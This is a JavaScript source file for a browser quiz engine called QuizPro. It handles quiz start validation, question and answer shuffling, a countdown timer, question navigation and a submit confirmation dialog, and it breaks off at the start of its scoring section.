/**
 * QuizPro — Distraction-Free Quiz Attempt Engine & Timer
 * Phase 10: Pre-quiz screen, Quiz Interface, State Management, Timer, Scoring
 */
const QuizEngine = (() => {
  const STATE_KEY = 'qms_active_attempt';
  let timerId = null;
  let beforeUnloadAttached = false;

  /* ---------- Helpers ---------- */
  function loadState() {
    try {
      return JSON.parse(sessionStorage.getItem(STATE_KEY) || 'null');
    } catch {
      return null;
    }
  }

  function saveState(state) {
    if (!state) return;
    try {
      sessionStorage.setItem(STATE_KEY, JSON.stringify(state));
      // Also mirror in localStorage for fail-safe resilience
      if (state.quizId && state.participantId) {
        localStorage.setItem(`qms_active_${state.quizId}_${state.participantId}`, JSON.stringify(state));
      }
    } catch (err) {
      console.warn('Storage save error:', err);
    }
  }

  function clearState() {
    const st = loadState();
    if (st && st.quizId && st.participantId) {
      try {
        localStorage.removeItem(`qms_active_${st.quizId}_${st.participantId}`);
      } catch (_) {}
    }
    sessionStorage.removeItem(STATE_KEY);
    if (timerId) {
      clearInterval(timerId);
      timerId = null;
    }
    removeBeforeUnloadGuard();
  }

  function hasActiveAttempt() {
    const st = loadState();
    return !!(st && st.questions && st.questions.length > 0 && !st.submitted);
  }

  function shuffle(arr) {
    const a = [...arr];
    for (let i = a.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [a[i], a[j]] = [a[j], a[i]];
    }
    return a;
  }

  function formatTime(sec, forceHours = false) {
    const s = Math.max(0, Math.floor(sec || 0));
    const h = Math.floor(s / 3600);
    const m = Math.floor((s % 3600) / 60);
    const remSec = s % 60;

    if (h > 0 || forceHours) {
      return `${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(remSec).padStart(2, '0')}`;
    }
    return `${String(m).padStart(2, '0')}:${String(remSec).padStart(2, '0')}`;
  }

  /* ---------- Page Leave Guard ---------- */
  function handleBeforeUnload(e) {
    if (hasActiveAttempt()) {
      e.preventDefault();
      e.returnValue = 'You have a quiz attempt in progress. Your progress may be lost if you leave.';
      return e.returnValue;
    }
  }

  function attachBeforeUnloadGuard() {
    if (!beforeUnloadAttached && typeof window !== 'undefined' && typeof window.addEventListener === 'function') {
      window.addEventListener('beforeunload', handleBeforeUnload);
      beforeUnloadAttached = true;
    }
  }

  function removeBeforeUnloadGuard() {
    if (beforeUnloadAttached && typeof window !== 'undefined' && typeof window.removeEventListener === 'function') {
      window.removeEventListener('beforeunload', handleBeforeUnload);
      beforeUnloadAttached = false;
    }
  }

  /* ---------- Toast Notification ---------- */
  function showToast(message, type = 'info') {
    const container = document.getElementById('quizToastContainer');
    if (!container) return;
    const toastEl = document.createElement('div');
    toastEl.className = `toast align-items-center text-white bg-${type === 'danger' ? 'danger' : type === 'warning' ? 'warning text-dark' : type === 'success' ? 'success' : 'dark'} border-0 show mb-2`;
    toastEl.setAttribute('role', 'alert');
    toastEl.setAttribute('aria-live', 'assertive');
    toastEl.setAttribute('aria-atomic', 'true');
    toastEl.innerHTML = `
      <div class="d-flex">
        <div class="toast-body">${QMS.escapeHtml(message)}</div>
        <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast" aria-label="Close"></button>
      </div>`;
    container.appendChild(toastEl);
    setTimeout(() => {
      toastEl.classList.remove('show');
      toastEl.remove();
    }, 4000);
  }

  /* ---------- Pre-Quiz Validation ---------- */
  function validateQuizStart(quizId, participantId) {
    if (!quizId || !participantId) {
      return {
        valid: false,
        title: 'Missing Parameters',
        message: 'Quiz ID or Participant ID was not provided in the URL.'
      };
    }

    const quiz = QMS.quizzes.get(quizId);
    if (!quiz) {
      return {
        valid: false,
        title: 'Quiz Not Found',
        message: `The requested quiz with ID "${quizId}" does not exist in the system.`
      };
    }

    const participant = QMS.participants.get(participantId);
    if (!participant) {
      return {
        valid: false,
        title: 'Participant Not Found',
        message: `The participant with ID "${participantId}" was not found.`
      };
    }

    if (quiz.status !== 'Active') {
      return {
        valid: false,
        title: 'Quiz Inactive',
        message: `This quiz is currently marked as "${quiz.status || 'Draft'}". Only active quizzes can be attempted.`
      };
    }

    if (participant.status !== 'Active') {
      return {
        valid: false,
        title: 'Participant Inactive',
        message: `Participant account "${participant.name}" is currently suspended or inactive.`
      };
    }

    // Schedule validation
    const now = new Date();
    const todayStr = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')}`;
    if (quiz.startDate && todayStr < quiz.startDate) {
      return {
        valid: false,
        title: 'Quiz Not Open Yet',
        message: `This quiz is scheduled to open on ${quiz.startDate}. Please check back later.`
      };
    }

    if (quiz.endDate && todayStr > quiz.endDate) {
      return {
        valid: false,
        title: 'Quiz Closed',
        message: `This quiz closed on ${quiz.endDate} and is no longer accepting new attempts.`
      };
    }

    // Attempts and Retakes validation
    const previousAttempts = QMS.results
      .all()
      .filter((r) => String(r.quizId).toLowerCase() === String(quizId).toLowerCase() &&
                     String(r.participantId).toLowerCase() === String(participantId).toLowerCase()).length;

    const allowRetake = quiz.allowRetake !== false && quiz.options?.allowRetake !== false;
    if (!allowRetake && previousAttempts > 0) {
      return {
        valid: false,
        title: 'Retakes Not Allowed',
        message: `You have already completed this quiz. Retakes are not permitted for this assessment.`,
        previousAttempts
      };
    }

    const maxAttempts = Number(quiz.maxAttempts || quiz.options?.maxAttempts) || 0;
    if (maxAttempts > 0 && previousAttempts >= maxAttempts) {
      return {
        valid: false,
        title: 'Maximum Attempts Reached',
        message: `You have reached the maximum allowed limit of ${maxAttempts} attempt(s) for this quiz.`,
        previousAttempts
      };
    }

    // Questions validation
    const questionIds = quiz.questionIds || [];
    const questions = questionIds.map((id) => QMS.questions.get(id)).filter(Boolean);
    if (!questions.length) {
      return {
        valid: false,
        title: 'No Questions Configured',
        message: 'This quiz does not have any questions assigned. Please contact the administrator.'
      };
    }

    return {
      valid: true,
      quiz,
      participant,
      questions,
      previousAttempts
    };
  }

  /* ---------- 10.1 Pre-Quiz Screen Rendering ---------- */
  function renderPreQuizScreen(quizId, participantId) {
    const root = document.getElementById('quizApp');
    if (!root) return;

    const validation = validateQuizStart(quizId, participantId);

    // If validation fails, render clear error / warning card
    if (!validation.valid) {
      root.innerHTML = `
        <div class="pre-quiz-card text-center">
          <div class="mb-3 text-warning">
            <i class="fa fa-triangle-exclamation fa-3x"></i>
          </div>
          <h2 class="h3 fw-bold mb-2">${QMS.escapeHtml(validation.title)}</h2>
          <p class="text-muted fs-6 mb-4">${QMS.escapeHtml(validation.message)}</p>
          <div class="d-flex justify-content-center gap-2">
            <a class="btn btn-brand text-white" href="index.html#quizzes">
              <i class="fa fa-arrow-left me-1"></i> Return to Quizzes
            </a>
            <a class="btn btn-outline-secondary" href="index.html#dashboard">
              Dashboard
            </a>
          </div>
        </div>`;
      return;
    }

    const { quiz, participant, questions, previousAttempts } = validation;
    const settings = QMS.getSettings() || {};
    const durationMin = Number(quiz.duration || quiz.timeLimit) || Number(settings.defaultDuration) || 30;
    const passingPct = Number(quiz.passingPercentage || quiz.passingScore) || Number(settings.defaultPassing) || 60;
    const maxAttempts = Number(quiz.maxAttempts || quiz.options?.maxAttempts) || 0;
    const attemptsDisplay = maxAttempts > 0 ? `${previousAttempts} / ${maxAttempts} used` : `${previousAttempts} taken (Unlimited)`;
    const isNeg = Boolean(quiz.negativeMarking || quiz.options?.negativeMarking);
    const negRate = Number(quiz.negativeRate ?? quiz.negativeFraction ?? 0.25);
    const negInfo = isNeg ? `Enabled (${Math.round(negRate * 100)}% deduction)` : 'Disabled (No penalty)';
    const category = QMS.categoryName(quiz.categoryId) || 'General';

    // Update topbar participant name
    const topBadge = document.getElementById('topParticipantBadge');
    const topName = document.getElementById('topParticipantName');
    if (topBadge && topName) {
      topName.textContent = participant.name;
      topBadge.classList.remove('d-none');
    }

    root.innerHTML = `
      <div class="pre-quiz-card">
        <div class="pre-quiz-header d-flex flex-wrap align-items-center justify-content-between gap-2">
          <div>
            <div class="d-flex align-items-center gap-2 mb-1">
              <span class="badge-soft badge-brand">${QMS.escapeHtml(category)}</span>
              <span class="badge-soft badge-${quiz.difficulty === 'Hard' ? 'danger' : quiz.difficulty === 'Medium' ? 'warning' : 'success'}">${QMS.escapeHtml(quiz.difficulty || 'Medium')}</span>
              <span class="badge-soft badge-info">ID: ${QMS.escapeHtml(quiz.id)}</span>
            </div>
            <h1 class="h2 fw-bold text-dark mb-1" id="preQuizTitle">${QMS.escapeHtml(quiz.title)}</h1>
          </div>
        </div>

        <div class="mb-4 text-muted">
          ${QMS.escapeHtml(quiz.description || 'Welcome to this assessment. Please review all guidelines and start when ready.')}
        </div>

        <div class="pre-quiz-instructions">
          <h5 class="fw-bold mb-2 text-dark"><i class="fa fa-circle-info me-2 text-brand"></i>Instructions & Rules</h5>
          <div class="small mb-2">${QMS.escapeHtml(quiz.instructions || 'Read each question carefully before submitting your answer.')}</div>
          <ul class="mb-0 ps-3 small text-muted">
            <li>You can navigate between questions using <strong>Previous</strong>, <strong>Next</strong>, or the question navigation grid.</li>
            <li>Use <strong>Mark for Review</strong> to flag uncertain questions and revisit them before final submission.</li>
            <li>Timer automatically counts down. Your attempt will be automatically submitted when time expires.</li>
            <li>${isNeg ? '<strong>Negative marking is active:</strong> incorrect answers will reduce your total score.' : '<strong>No negative marking:</strong> no penalty for incorrect answers.'}</li>
          </ul>
        </div>

        <div class="pre-quiz-stats-grid">
          <div class="pre-quiz-stat-card">
            <i class="fa fa-list-check text-brand fs-4 mb-1"></i>
            <div class="text-muted small">Total Questions</div>
            <div class="pre-quiz-stat-val">${questions.length}</div>
          </div>
          <div class="pre-quiz-stat-card">
            <i class="fa fa-stopwatch text-brand fs-4 mb-1"></i>
            <div class="text-muted small">Duration</div>
            <div class="pre-quiz-stat-val">${durationMin} mins</div>
          </div>
          <div class="pre-quiz-stat-card">
            <i class="fa fa-bullseye text-brand fs-4 mb-1"></i>
            <div class="text-muted small">Passing Score</div>
            <div class="pre-quiz-stat-val">${passingPct}%</div>
          </div>
          <div class="pre-quiz-stat-card">
            <i class="fa fa-rotate-right text-brand fs-4 mb-1"></i>
            <div class="text-muted small">Attempts</div>
            <div class="pre-quiz-stat-val" style="font-size:1.05rem;">${attemptsDisplay}</div>
          </div>
          <div class="pre-quiz-stat-card">
            <i class="fa fa-scale-balanced text-brand fs-4 mb-1"></i>
            <div class="text-muted small">Negative Marking</div>
            <div class="pre-quiz-stat-val" style="font-size:1.05rem;">${negInfo}</div>
          </div>
        </div>

        <div class="d-flex flex-wrap align-items-center justify-content-between pt-3 border-top gap-3">
          <div class="d-flex align-items-center gap-2">
            <div class="avatar-sm rounded-circle bg-primary-soft text-brand d-flex align-items-center justify-content-center fw-bold" style="width:38px;height:38px;">
              ${participant.name.charAt(0).toUpperCase()}
            </div>
            <div>
              <div class="fw-semibold text-dark">${QMS.escapeHtml(participant.name)}</div>
              <small class="text-muted">${QMS.escapeHtml(participant.email || participant.id)}</small>
            </div>
          </div>

          <div class="d-flex gap-2">
            <a class="btn btn-outline-secondary px-3" href="index.html#quizzes">Cancel</a>
            <button type="button" class="btn btn-brand text-white px-4 py-2 fw-semibold" id="btnStartQuiz">
              <i class="fa fa-play me-2"></i> Start Quiz
            </button>
          </div>
        </div>
      </div>`;

    document.getElementById('btnStartQuiz')?.addEventListener('click', () => {
      if (start({ quizId, participantId })) {
        bindAttemptUI();
      }
    });
  }

  /* ---------- 10.3 Start Attempt & State Preparation ---------- */
  function start({ quizId, participantId }) {
    const validation = validateQuizStart(quizId, participantId);
    if (!validation.valid) {
      renderPreQuizScreen(quizId, participantId);
      return false;
    }

    const { quiz, questions } = validation;
    const settings = QMS.getSettings() || {};
    const shouldRandomizeQ = Boolean(quiz.randomizeQuestions || quiz.options?.randomizeQuestions || settings.randomQuestions);
    const shouldRandomizeA = Boolean(quiz.randomizeAnswers || quiz.options?.randomizeAnswers || settings.randomizeAnswers);

    let preparedQuestions = [...questions];
    if (shouldRandomizeQ) {
      preparedQuestions = shuffle(preparedQuestions);
    }

    preparedQuestions = preparedQuestions.map((q) => {
      const copy = {
        ...q,
        options: { ...(q.options || {}) }
      };

      // Randomize options for multiple-choice while preserving correct answer mapping
      if (shouldRandomizeA && (q.type === 'mcq' || q.type === 'truefalse')) {
        const originalEntries = Object.entries(copy.options);
        if (originalEntries.length > 1) {
          const originalCorrectKey = String(q.correctAnswer).trim().toUpperCase();
          const originalCorrectText = copy.options[originalCorrectKey] || copy.options[q.correctAnswer];

          const shuffled = shuffle(originalEntries);
          const newMap = {};
          let newCorrectKey = q.correctAnswer;

          shuffled.forEach(([oldKey, text], idx) => {
            const letter = String.fromCharCode(65 + idx);
            newMap[letter] = text;
            if (oldKey === originalCorrectKey || text === originalCorrectText) {
              newCorrectKey = letter;
            }
          });

          copy.options = newMap;
          copy.correctAnswer = newCorrectKey;
        }
      }
      return copy;
    });

    const durationMin = Number(quiz.duration || quiz.timeLimit) || Number(settings.defaultDuration) || 30;
    const durationSec = durationMin * 60;
    const now = Date.now();
    const endsAt = now + durationSec * 1000;

    const timerSetting = settings.enableTimer !== false;
    const displayTimer = timerSetting && (quiz.displayTimer !== false && quiz.options?.displayTimer !== false);

    const state = {
      quizId,
      participantId,
      questions: preparedQuestions,
      answers: {},
      review: {},
      index: 0,
      startedAt: now,
      durationSec,
      endsAt,
      timerEnabled: timerSetting,
      displayTimer,
      negativeMarking: Boolean(quiz.negativeMarking || quiz.options?.negativeMarking),
      negativeRate: Number(quiz.negativeRate ?? quiz.negativeFraction ?? 0.25),
      passingPercentage: Number(quiz.passingPercentage || quiz.passingScore) || Number(settings.defaultPassing) || 60,
      submitted: false
    };

    saveState(state);
    attachBeforeUnloadGuard();
    return true;
  }

  /* ---------- 10.2 & 10.3 Quiz UI & Interaction ---------- */
  function bindAttemptUI() {
    const root = document.getElementById('quizApp');
    if (!root) return;

    const state = loadState();
    if (!state || !state.questions || state.questions.length === 0) {
      renderPreQuizScreen();
      return;
    }

    // If time already expired while page was away, submit immediately
    if (state.timerEnabled && state.endsAt <= Date.now()) {
      submit(true);
      return;
    }

    attachBeforeUnloadGuard();
    const quiz = QMS.quizzes.get(state.quizId) || { title: 'Assessment', id: state.quizId };
    const participant = QMS.participants.get(state.participantId) || { name: 'Participant', id: state.participantId };

    // Update topbar participant name
    const topBadge = document.getElementById('topParticipantBadge');
    const topName = document.getElementById('topParticipantName');
    if (topBadge && topName) {
      topName.textContent = participant.name;
      topBadge.classList.remove('d-none');
    }

    const render = () => {
      const st = loadState();
      if (!st || !st.questions) return;

      const total = st.questions.length;
      const curIdx = Math.max(0, Math.min(st.index, total - 1));
      const q = st.questions[curIdx];

      // Answered counts & progress
      const answeredKeys = Object.keys(st.answers).filter((k) => {
        const val = st.answers[k];
        return val !== null && val !== undefined && String(val).trim() !== '';
      });
      const answeredCount = answeredKeys.length;
      const progressPct = total > 0 ? Math.round((answeredCount / total) * 100) : 0;
      const isReviewed = Boolean(st.review[q.id]);
      const currentAns = st.answers[q.id] || '';

      // Render Options according to question type
      let optionsHTML = '';
      const qType = QMS.normalizeQuestionType(q.type);

      if (qType === 'mcq' || qType === 'truefalse') {
        const entries = Object.entries(q.options || {});
        optionsHTML = `
          <div class="quiz-options-container" role="radiogroup" aria-label="Question options">
            ${entries.map(([key, text]) => {
              const isSelected = String(currentAns).trim().toUpperCase() === String(key).trim().toUpperCase();
              return `
                <button type="button" 
                  class="option-card-btn ${isSelected ? 'selected' : ''}" 
                  data-option-key="${QMS.escapeHtml(key)}"
                  role="radio"
                  aria-checked="${isSelected}">
                  <span class="option-card-badge">${QMS.escapeHtml(key)}</span>
                  <span class="option-card-text">${QMS.escapeHtml(text)}</span>
                  ${isSelected ? '<i class="fa fa-circle-check ms-auto text-brand"></i>' : ''}
                </button>`;
            }).join('')}
          </div>`;
      } else if (qType === 'short') {
        optionsHTML = `
          <div class="mb-4">
            <label for="shortAnswerInput" class="form-label fw-semibold text-dark">Your Answer:</label>
            <input type="text" 
              class="form-control form-control-lg" 
              id="shortAnswerInput" 
              placeholder="Type your short answer here..." 
              value="${QMS.escapeHtml(currentAns)}" 
              autocomplete="off" />
            <small class="text-muted mt-1 d-block">Answers are case-insensitive. Provide the concise term or phrase.</small>
          </div>`;
      } else {
        // fill in the blank
        optionsHTML = `
          <div class="mb-4">
            <label for="fillBlankInput" class="form-label fw-semibold text-dark">Fill in the blank:</label>
            <input type="text" 
              class="form-control form-control-lg" 
              id="fillBlankInput" 
              placeholder="Type the missing word or phrase..." 
              value="${QMS.escapeHtml(currentAns)}" 
              autocomplete="off" />
            <small class="text-muted mt-1 d-block">Type the exact term that completes the statement.</small>
          </div>`;
      }

      // Navigator buttons grid
      const navButtonsHTML = st.questions.map((item, idx) => {
        const hasAnswer = st.answers[item.id] !== undefined && st.answers[item.id] !== null && String(st.answers[item.id]).trim() !== '';
        const itemReviewed = Boolean(st.review[item.id]);
        const isCurrent = idx === curIdx;

        const classes = [
          'nav-q-btn',
          isCurrent ? 'current' : '',
          hasAnswer ? 'answered' : 'unanswered',
          itemReviewed ? 'review' : ''
        ].filter(Boolean).join(' ');

        return `
          <button type="button" 
            class="${classes}" 
            data-goto="${idx}" 
            title="Question ${idx + 1}: ${hasAnswer ? 'Answered' : 'Unanswered'}${itemReviewed ? ' (Marked for Review)' : ''}"
            aria-label="Question ${idx + 1}">
            ${idx + 1}
          </button>`;
      }).join('');

      // Layout Assembly
      root.innerHTML = `
        <div class="quiz-wrapper">
          <!-- Top Assessment Header -->
          <div class="quiz-header-card">
            <div class="d-flex flex-wrap align-items-center justify-content-between gap-3">
              <div>
                <h2 class="h4 fw-bold text-dark mb-1">${QMS.escapeHtml(quiz.title)}</h2>
                <div class="d-flex flex-wrap align-items-center gap-3 text-muted small">
                  <span><i class="fa fa-user me-1 text-brand"></i>${QMS.escapeHtml(participant.name)}</span>
                  <span><i class="fa fa-hashtag me-1"></i>Question ${curIdx + 1} of ${total}</span>
                  <span class="badge-soft badge-info">${answeredCount}/${total} Answered</span>
                </div>
              </div>

              <!-- Countdown Timer -->
              <div class="timer-container ${st.displayTimer ? 'timer-normal' : 'd-none'}" id="quizTimer" role="timer" aria-live="polite">
                <i class="fa fa-clock"></i>
                <span id="quizTimerText">--:--</span>
              </div>
            </div>

            <!-- Live Progress Bar -->
            <div class="quiz-progress-wrapper mt-3">
              <div class="quiz-progress-text">
                <span>Progress: ${progressPct}% completed</span>
                <span>${total - answeredCount} remaining</span>
              </div>
              <div class="quiz-progress-bar-bg">
                <div class="quiz-progress-bar-fill" style="width: ${progressPct}%;"></div>
              </div>
            </div>
          </div>

          <!-- Main Question Grid (Question + Navigator) -->
          <div class="quiz-main-grid">
            <!-- Question Content Area -->
            <div class="quiz-question-card">
              <div class="d-flex flex-wrap align-items-center justify-content-between gap-2 pb-3 border-bottom mb-3">
                <div class="d-flex align-items-center gap-2">
                  <span class="badge-soft badge-brand fw-bold">Question ${curIdx + 1}</span>
                  <span class="badge-soft badge-muted">${QMS.escapeHtml((q.type || 'MCQ').toUpperCase())}</span>
                  <span class="badge-soft badge-muted">${QMS.escapeHtml(q.difficulty || 'Medium')}</span>
                </div>
                <div class="fw-semibold text-muted small">
                  <i class="fa fa-award me-1 text-brand"></i>${q.marks || 1} mark(s)
                </div>
              </div>

              <!-- Question Text -->
              <h3 class="quiz-question-text" id="activeQuestionText">${QMS.escapeHtml(q.text)}</h3>

              <!-- Interactive Options -->
              ${optionsHTML}

              <!-- Action Buttons Bar -->
              <div class="d-flex flex-wrap align-items-center justify-content-between gap-2 pt-3 border-top mt-4">
                <div class="d-flex gap-2">
                  <button type="button" class="btn btn-outline-secondary px-3" id="btnPrev" ${curIdx === 0 ? 'disabled' : ''}>
                    <i class="fa fa-arrow-left me-1"></i> Previous
                  </button>
                  <button type="button" class="btn btn-outline-secondary px-3" id="btnNext" ${curIdx >= total - 1 ? 'disabled' : ''}>
                    Next <i class="fa fa-arrow-right ms-1"></i>
                  </button>
                </div>

                <div class="d-flex gap-2 ms-auto">
                  <button type="button" class="btn ${isReviewed ? 'btn-warning text-dark' : 'btn-outline-warning'}" id="btnReview">
                    <i class="fa fa-flag me-1"></i> ${isReviewed ? 'Marked for Review' : 'Mark for Review'}
                  </button>
                  <button type="button" class="btn btn-outline-secondary" id="btnClearAnswer" title="Clear your selected answer">
                    <i class="fa fa-eraser me-1"></i> Clear
                  </button>
                  <button type="button" class="btn btn-brand text-white fw-bold px-3" id="btnSubmitTop">
                    <i class="fa fa-check-double me-1"></i> Submit Quiz
                  </button>
                </div>
              </div>
            </div>

            <!-- Right Question Navigator Panel (Sticky / Collapsible) -->
            <div class="q-navigator-panel">
              <div class="d-flex align-items-center justify-content-between mb-2">
                <button type="button" class="btn btn-sm btn-outline-brand d-lg-none py-1 px-2" id="btnToggleNavGrid" aria-expanded="false" aria-controls="qNavCollapsible">
                  <i class="fa fa-list-ol me-1"></i> Question Navigator (${curIdx + 1}/${total}) <i class="fa fa-chevron-down ms-1" id="qNavChevron"></i>
                </button>
                <h5 class="fw-bold mb-0 text-dark d-none d-lg-block" style="font-size:1.05rem;">
                  <i class="fa fa-grid-2 me-1 text-brand"></i> Questions
                </h5>
                <span class="badge-soft badge-brand d-none d-lg-inline-block">${curIdx + 1} / ${total}</span>
              </div>

              <div class="q-nav-collapsible d-none d-lg-block" id="qNavCollapsible">
                <div class="q-nav-grid" id="questionNavGrid">
                  ${navButtonsHTML}
                </div>

                <div class="q-legend">
                  <div class="q-legend-item">
                    <div class="q-legend-dot dot-answered"></div>
                    <span>Answered (${answeredCount})</span>
                  </div>
                  <div class="q-legend-item">
                    <div class="q-legend-dot dot-current"></div>
                    <span>Current Question</span>
                  </div>
                  <div class="q-legend-item">
                    <div class="q-legend-dot dot-review"></div>
                    <span>Marked for Review (${Object.keys(st.review).filter(k => st.review[k]).length})</span>
                  </div>
                  <div class="q-legend-item">
                    <div class="q-legend-dot dot-unanswered"></div>
                    <span>Unanswered (${total - answeredCount})</span>
                  </div>
                </div>

                <div class="mt-4 pt-3 border-top">
                  <button type="button" class="btn btn-brand text-white w-100 py-2 fw-semibold" id="btnSideSubmit">
                    <i class="fa fa-check-circle me-1"></i> Submit Quiz
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>`;

      // Event Bindings
      // Option Selection (MCQ / TrueFalse)
      document.querySelectorAll('.option-card-btn').forEach((btn) => {
        btn.addEventListener('click', () => {
          const key = btn.dataset.optionKey;
          setAnswer(q.id, key);
          render();
          tickTimer();
        });
      });

      // Text Input (Short Answer / Blank)
      const shortInp = document.getElementById('shortAnswerInput');
      if (shortInp) {
        shortInp.focus();
        shortInp.addEventListener('input', (e) => {
          setAnswer(q.id, e.target.value, false);
          // Update navigator visual state without re-rendering active input
          updateNavIndicator(q.id, e.target.value);
        });
        shortInp.addEventListener('keydown', (e) => {
          if (e.key === 'Enter') {
            e.preventDefault();
            if (curIdx < total - 1) goToQuestion(curIdx + 1);
          }
        });
      }

      const blankInp = document.getElementById('fillBlankInput');
      if (blankInp) {
        blankInp.focus();
        blankInp.addEventListener('input', (e) => {
          setAnswer(q.id, e.target.value, false);
          updateNavIndicator(q.id, e.target.value);
        });
        blankInp.addEventListener('keydown', (e) => {
          if (e.key === 'Enter') {
            e.preventDefault();
            if (curIdx < total - 1) goToQuestion(curIdx + 1);
          }
        });
      }

      // Prev & Next Buttons
      document.getElementById('btnPrev')?.addEventListener('click', () => {
        if (curIdx > 0) goToQuestion(curIdx - 1);
      });

      document.getElementById('btnNext')?.addEventListener('click', () => {
        if (curIdx < total - 1) goToQuestion(curIdx + 1);
      });

      // Review Toggle
      document.getElementById('btnReview')?.addEventListener('click', () => {
        toggleReview(q.id);
        render();
        tickTimer();
      });

      // Clear Answer
      document.getElementById('btnClearAnswer')?.addEventListener('click', () => {
        clearAnswer(q.id);
        render();
        tickTimer();
      });

      // Mobile Question Navigator Drawer Toggle
      document.getElementById('btnToggleNavGrid')?.addEventListener('click', () => {
        const panel = document.getElementById('qNavCollapsible');
        const btn = document.getElementById('btnToggleNavGrid');
        const icon = document.getElementById('qNavChevron');
        if (!panel) return;
        panel.classList.toggle('d-none');
        const isOpen = !panel.classList.contains('d-none');
        btn?.setAttribute('aria-expanded', String(isOpen));
        if (icon) icon.className = isOpen ? 'fa fa-chevron-up ms-1' : 'fa fa-chevron-down ms-1';
      });

      // Navigation Grid buttons
      document.querySelectorAll('[data-goto]').forEach((btn) => {
        btn.addEventListener('click', () => {
          const targetIdx = Number(btn.dataset.goto);
          goToQuestion(targetIdx);
        });
      });

      // Submit Quiz buttons
      document.getElementById('btnSubmitTop')?.addEventListener('click', showSubmitConfirmation);
      document.getElementById('btnSideSubmit')?.addEventListener('click', showSubmitConfirmation);
    };

    function updateNavIndicator(qId, val) {
      const st = loadState();
      if (!st) return;
      const targetBtn = document.querySelector(`[data-goto="${st.index}"]`);
      if (targetBtn) {
        const hasAns = String(val || '').trim() !== '';
        targetBtn.classList.toggle('answered', hasAns);
        targetBtn.classList.toggle('unanswered', !hasAns);
      }
    }

    // Timer Tick Logic
    const tickTimer = () => {
      const st = loadState();
      if (!st || st.submitted) return;
      if (st.timerEnabled === false) return;

      const remaining = Math.max(0, Math.floor((st.endsAt - Date.now()) / 1000));
      const timerEl = document.getElementById('quizTimer');
      const timerText = document.getElementById('quizTimerText');

      if (timerText) {
        const forceHours = (st.durationSec || 0) >= 3600;
        timerText.textContent = formatTime(remaining, forceHours);
      }

      if (timerEl) {
        const totalDuration = st.durationSec || 1800;
        const isDanger = remaining <= totalDuration * 0.10 || remaining <= 60;
        const isWarning = !isDanger && (remaining <= totalDuration * 0.25 || remaining <= 300);

        timerEl.classList.toggle('timer-danger', isDanger);
        timerEl.classList.toggle('timer-warning', isWarning);
        timerEl.classList.toggle('timer-normal', !isDanger && !isWarning);
      }

      if (remaining <= 0) {
        if (timerId) clearInterval(timerId);
        timerId = null;
        submit(true);
      }
    };

    // Keyboard Shortcuts
    const handleKeydown = (e) => {
      const activeEl = document.activeElement;
      const isInput = activeEl && (activeEl.tagName === 'INPUT' || activeEl.tagName === 'TEXTAREA');

      if (e.key === 'ArrowLeft' && !isInput) {
        const st = loadState();
        if (st && st.index > 0) goToQuestion(st.index - 1);
      } else if (e.key === 'ArrowRight' && !isInput) {
        const st = loadState();
        if (st && st.index < st.questions.length - 1) goToQuestion(st.index + 1);
      } else if ((e.key === 'm' || e.key === 'M') && !isInput) {
        const st = loadState();
        if (st) {
          const q = st.questions[st.index];
          if (q) {
            toggleReview(q.id);
            render();
            tickTimer();
          }
        }
      } else if (!isInput && ['1', '2', '3', '4', 'a', 'b', 'c', 'd', 'A', 'B', 'C', 'D'].includes(e.key)) {
        const st = loadState();
        if (st) {
          const q = st.questions[st.index];
          const qType = QMS.normalizeQuestionType(q.type);
          if (qType === 'mcq' || qType === 'truefalse') {
            let keyToSelect = e.key.toUpperCase();
            if (['1', '2', '3', '4'].includes(e.key)) {
              keyToSelect = String.fromCharCode(65 + parseInt(e.key, 10) - 1);
            }
            if (q.options && q.options[keyToSelect]) {
              setAnswer(q.id, keyToSelect);
              render();
              tickTimer();
            }
          }
        }
      }
    };

    window.removeEventListener('keydown', handleKeydown);
    window.addEventListener('keydown', handleKeydown);

    // Initial render and timer interval
    render();
    tickTimer();
    if (timerId) clearInterval(timerId);
    timerId = setInterval(tickTimer, 1000);
  }

  /* ---------- State Modifiers ---------- */
  function setAnswer(questionId, value, shouldSave = true) {
    const st = loadState();
    if (!st) return;
    st.answers[questionId] = value;
    if (shouldSave) saveState(st);
    else sessionStorage.setItem(STATE_KEY, JSON.stringify(st));
  }

  function clearAnswer(questionId) {
    const st = loadState();
    if (!st) return;
    delete st.answers[questionId];
    saveState(st);
  }

  function toggleReview(questionId) {
    const st = loadState();
    if (!st) return;
    st.review[questionId] = !st.review[questionId];
    saveState(st);
  }

  function goToQuestion(index) {
    const st = loadState();
    if (!st) return;
    st.index = Math.max(0, Math.min(index, st.questions.length - 1));
    saveState(st);
    bindAttemptUI();
  }

  /* ---------- 10.4 Confirmation Modal ---------- */
  function showSubmitConfirmation() {
    const st = loadState();
    if (!st) return;

    const total = st.questions.length;
    const answeredKeys = Object.keys(st.answers).filter((k) => {
      const val = st.answers[k];
      return val !== null && val !== undefined && String(val).trim() !== '';
    });
    const answered = answeredKeys.length;
    const unanswered = Math.max(0, total - answered);
    const review = Object.keys(st.review).filter((k) => st.review[k]).length;

    const ansEl = document.getElementById('confirmAnsweredCount');
    const unansEl = document.getElementById('confirmUnansweredCount');
    const revEl = document.getElementById('confirmReviewCount');
    const warnAlert = document.getElementById('confirmWarningAlert');
    const warnText = document.getElementById('confirmWarningText');

    if (ansEl) ansEl.textContent = answered;
    if (unansEl) unansEl.textContent = unanswered;
    if (revEl) revEl.textContent = review;

    if (warnAlert && warnText) {
      if (unanswered > 0) {
        warnAlert.classList.remove('d-none');
        warnText.textContent = `You have ${unanswered} unanswered question(s). You can still return and answer them before submitting.`;
      } else {
        warnAlert.classList.add('d-none');
      }
    }

    const modalEl = document.getElementById('submitConfirmModal');
    if (modalEl && window.bootstrap?.Modal) {
      const modalInstance = bootstrap.Modal.getOrCreateInstance(modalEl);
      modalInstance.show();

      const confirmBtn = document.getElementById('modalConfirmSubmitBtn');
      if (confirmBtn) {
        confirmBtn.onclick = () => {
          modalInstance.hide();
          submit(false);
        };
      }
    } else {
      let msg = `Submit quiz?\n\n- Answered: ${answered} / ${total}\n- Unanswered: ${unanswered}\n- Marked for Review: ${review}`;
      if (unanswered > 0) msg += `\n\nWarning: You have ${unanswered} unanswered question(s)!`;
      if (confirm(msg)) {
        submit(false);
      }
    }
  }

  /* ---------- 10.5 Submission, Scoring, & Persistence ---------- */
